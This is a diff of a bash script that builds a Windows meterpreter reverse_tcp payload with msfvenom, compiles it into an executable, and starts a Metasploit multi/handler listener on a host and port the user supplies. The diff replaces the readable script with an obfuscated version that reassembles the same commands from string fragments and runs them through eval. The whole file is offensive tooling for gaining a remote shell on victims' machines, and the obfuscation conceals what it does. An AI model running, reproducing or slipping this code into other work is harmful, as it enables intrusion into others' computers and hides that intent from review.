@@ -3,64 +3,6 @@
 # Github : Djawad-Hammadi
 # Date : 24/01/2022
 # Let's Start This Shit 
-banner(){
-if [[ -e handler.rc ]];then
-rm -rf handler.rc
-fi
-printf "
-\033[0;31m                Look At Me I'm Roning (:
-\033[1;33m         />_________________________________
-\033[1;33m[########[]_________________________________>
-\033[1;33m         \>
-\033[0;34m        [---] Coded By : \033[0;31mDjawed Hammadi \033[0;34m(\033[1;33mx-line\033[0;34m) [---]
-\033[0;34m          [---] Follow me on Twitter: \033[0;35m@xlinex23 \033[0;34m[---]                
-"
-}
-main(){
-python3=`which python3` 
-if [[ "$?" == "0" ]];then
-sleep 2 
-printf ""
-else 
-printf "\n\033[0;32m[#]\033[1;37m Python3 Not Found In Your System (;\n\n"
-printf "\033[1;33mInstalling It :\n"
-apt-get install python3 -y 
-printf "\n\033[0;32mDone..\n\n"
-fi
-mingw=`which x86_64-w64-mingw32-g++`
-if [[ "$?" == "0" ]];then
-sleep 2 
-printf ""
-else 
-printf "\n\033[0;32m[#]\033[1;37m mingw32 Not Found In Your System (;\n\n"
-printf "\033[1;33mInstalling It :\n"
-apt-get install g++ -y 
-printf "\n\033[0;32mDone..\n\n"
-fi
-sleep 5 
-clear
-banner
-printf "\n\033[0;32mEnter Host : " ;read host
-printf "\n\033[0;32mEnter Port : " ;read port
-sleep 5 
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$host lport=$port -f raw -o she3ll.bin > /dev/null 2>&1
-printf "\n\033[1;37mPayload Generated"
-python3 help.py she3ll.bin > /dev/null 2>&1
-printf "\n\n\033[1;30ma.exe \033[0;31mGenerated And Compiled Successfully"
-printf "\n\n\033[1;33mCreate Multi Handler Session For you ! \n\n"
-if [[ -e she3ll.bin ]];then
-rm -rf she3ll.bin
-fi
-echo "
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST $host
-set LPORT $port
-exploit
-" > handler.rc
-msfconsole -r handler.rc
-}
-main
-
-
-      
+z="
+";Kz='rm -';oBz='else';qEz='rc';hz='____';QBz='er: ';hDz='ll.b';Mz='andl';LCz='apt-';JEz='er S';UBz='4m[-';uCz='msfv';sCz='rt :';fz='   /';OEz=' \n\';ECz=';\n\';vBz='thon';Cz='{';WCz='hich';nBz='p 2';eDz='help';SBz='line';VEz='echo';oCz='read';sEz='onso';bEz='i/ha';gCz='p 5';RDz='.bin';sz='--] ';Oz='c';UCz='ming';lEz='ort';xz='0;31';PDz='o sh';jCz='er';OBz='on T';jEz='LPOR';YCz='_64-';FBz='mx-l';XDz='33[1';nCz=' " ;';Bz='er()';eEz='payl';tEz='le -';kEz='T $p';HBz='0;34';yz='mDja';nz='__>';OCz='all ';YEz='expl';Fz=' han';mDz='>&1';fBz='n3`';DCz='em (';ez='3m  ';SEz='rf s';ZBz='(){';qDz='1mGe';UEz='l.bi';DBz='4m(\';DEz=' Fol';iz='__';Qz='prin';PBz='witt';GBz='ine\';hBz='?" =';WEz=' "';MBz='llow';ACz='In Y';lCz='r Ho';TDz='dev/';cBz='`whi';NBz=' me ';LDz='t=$p';qCz='t';DDz='ter/';az=' Ron';wz='033[';jDz=' /de';KEz='essi';aBz='pyth';cDz='rate';IBz='m) [';KBz='[---';EEz='der"';LBz='] Fo';yDz='full';Hz='.rc ';fCz='g++ ';TBz='x23 ';bz='ing ';fEz='tcp';eCz='2 No';rBz=';32m';mCz='st :';EDz='reve';oEz='hand';nEz='" > ';VCz='w=`w';RBz='5m@x';UDz='null';wCz=' -p ';uBz='m Py';ADz='x64/';CDz='rpre';rCz='r Po';Az='bann';GEz='eate';JBz='---]';AEz='y In';PCz='on3 ';BBz='Hamm';ODz='aw -';JDz='ost ';WBz='"';xBz='t Fo';xCz='wind';aCz='w32-';GCz='3mIn';Pz='fi';ICz='ling';gz='>___';jBz='" ]]';Lz='rf h';VDz=' 2>&';eBz='ytho';QCz='-y';mEz='oit';QDz='e3ll';rEz='msfc';IDz='t=$h';RCz='Done';cEz='ndle';tCz=' por';qz='4m  ';QEz='3ll.';kCz='Ente';pCz=' hos';Yz='t Me';vz=' : \';Vz='    ';Ez='[ -e';oDz='0ma.';FDz='rse_';pEz='ler.';PEz=' she';pz='>';SCz='..\n';bDz='Gene';YBz='main';CEz='ptut';uz='d By';Nz='er.r';wDz=' Suc';BCz='our ';gDz='she3';FEz='3mCr';Jz='hen';mz=']___';oz='   \';LEz='on F';REz='bin ';ZDz='Payl';BDz='mete';MDz='ort ';gBz='[ "$';Tz='[0;3';hCz='clea';bCz='g++`';wBz='3 No';dCz='ngw3';mBz='slee';YDz=';37m';cz='(:';vEz='r.rc';dDz='d"';nDz='\n\n';pDz='exe ';Wz='  Lo';hEz='T $h';ZCz='w64-';Xz='ok A';rz='  [-';NEz='ou !';gEz='LHOS';pBz='\n\0';iDz='in >';iEz='ost';Iz=']];t';kBz=';the';rDz='nera';HCz='stal';dEz='set ';tBz='1;37';lDz='ll 2';yBz='und ';NDz='-f r';Dz='if [';tDz='And ';MEz='or y';iCz='r';vCz='enom';CBz='adi ';qBz='33[0';ABz='wed ';kz='####';CCz='Syst';dz='[1;3';bBz='on3=';XCz=' x86';TEz='he3l';aDz='oad ';HDz='lhos';GDz='tcp ';sDz='ted ';KCz=':\n"';TCz='\n"';dBz='ch p';uDz='Comp';ZEz='oit/';KDz='lpor';WDz='1';cCz='m mi';vDz='iled';iBz='= "0';Rz='tf "';Uz='1m  ';tz='Code';yCz='ows/';kDz='v/nu';EBz='1;33';Sz='\033';sBz='[#]\';VBz='--]';HEz=' Mul';BEz=' Out';NCz='inst';MCz='get ';jz='3m[#';SDz=' > /';IEz='ti H';fDz='.py ';XEz='use ';Gz='dler';xDz='cess';FCz='n"';XBz='}';aEz='mult';uEz='r ha';lz='###[';JCz=' It ';Zz=' I'\''m';lBz='n';
+eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$Mz$Nz$Oz$z$Pz$z$Qz$Rz$z$Sz$Tz$Uz$Vz$Vz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$z$Sz$dz$ez$Vz$fz$gz$hz$hz$hz$hz$hz$hz$hz$iz$z$Sz$dz$jz$kz$lz$mz$hz$hz$hz$hz$hz$hz$hz$nz$z$Sz$dz$ez$Vz$oz$pz$z$Sz$Tz$qz$Vz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$Sz$Tz$DBz$wz$EBz$FBz$GBz$wz$HBz$IBz$JBz$z$Sz$Tz$qz$Vz$Vz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$Sz$Tz$RBz$SBz$TBz$Sz$Tz$UBz$VBz$z$WBz$z$XBz$z$YBz$ZBz$z$aBz$bBz$cBz$dBz$eBz$fBz$z$Dz$gBz$hBz$iBz$jBz$kBz$lBz$z$mBz$nBz$z$Qz$Rz$WBz$z$oBz$z$Qz$Rz$pBz$qBz$rBz$sBz$wz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$z$Qz$Rz$Sz$dz$GCz$HCz$ICz$JCz$KCz$z$LCz$MCz$NCz$OCz$aBz$PCz$QCz$z$Qz$Rz$pBz$qBz$rBz$RCz$SCz$TCz$z$Pz$z$UCz$VCz$WCz$XCz$YCz$ZCz$UCz$aCz$bCz$z$Dz$gBz$hBz$iBz$jBz$kBz$lBz$z$mBz$nBz$z$Qz$Rz$WBz$z$oBz$z$Qz$Rz$pBz$qBz$rBz$sBz$wz$tBz$cCz$dCz$eCz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$z$Qz$Rz$Sz$dz$GCz$HCz$ICz$JCz$KCz$z$LCz$MCz$NCz$OCz$fCz$QCz$z$Qz$Rz$pBz$qBz$rBz$RCz$SCz$TCz$z$Pz$z$mBz$gCz$z$hCz$iCz$z$Az$jCz$z$Qz$Rz$pBz$qBz$rBz$kCz$lCz$mCz$nCz$oCz$pCz$qCz$z$Qz$Rz$pBz$qBz$rBz$kCz$rCz$sCz$nCz$oCz$tCz$qCz$z$mBz$gCz$z$uCz$vCz$wCz$xCz$yCz$ADz$BDz$CDz$DDz$EDz$FDz$GDz$HDz$IDz$JDz$KDz$LDz$MDz$NDz$ODz$PDz$QDz$RDz$SDz$TDz$UDz$VDz$WDz$z$Qz$Rz$pBz$XDz$YDz$ZDz$aDz$bDz$cDz$dDz$z$aBz$PCz$eDz$fDz$gDz$hDz$iDz$jDz$kDz$lDz$mDz$z$Qz$Rz$nDz$Sz$dz$oDz$pDz$Sz$Tz$qDz$rDz$sDz$tDz$uDz$vDz$wDz$xDz$yDz$AEz$BEz$CEz$DEz$EEz$z$Qz$Rz$nDz$Sz$dz$FEz$GEz$HEz$IEz$Mz$JEz$KEz$LEz$MEz$NEz$OEz$FCz$z$Dz$Ez$PEz$QEz$REz$Iz$Jz$z$Kz$SEz$TEz$UEz$lBz$z$Pz$z$VEz$WEz$z$XEz$YEz$ZEz$aEz$bEz$cEz$iCz$z$dEz$eEz$aDz$xCz$yCz$ADz$BDz$CDz$DDz$EDz$FDz$fEz$z$dEz$gEz$hEz$iEz$z$dEz$jEz$kEz$lEz$z$YEz$mEz$z$nEz$oEz$pEz$qEz$z$rEz$sEz$tEz$uEz$cEz$vEz$z$XBz$z$YBz" 
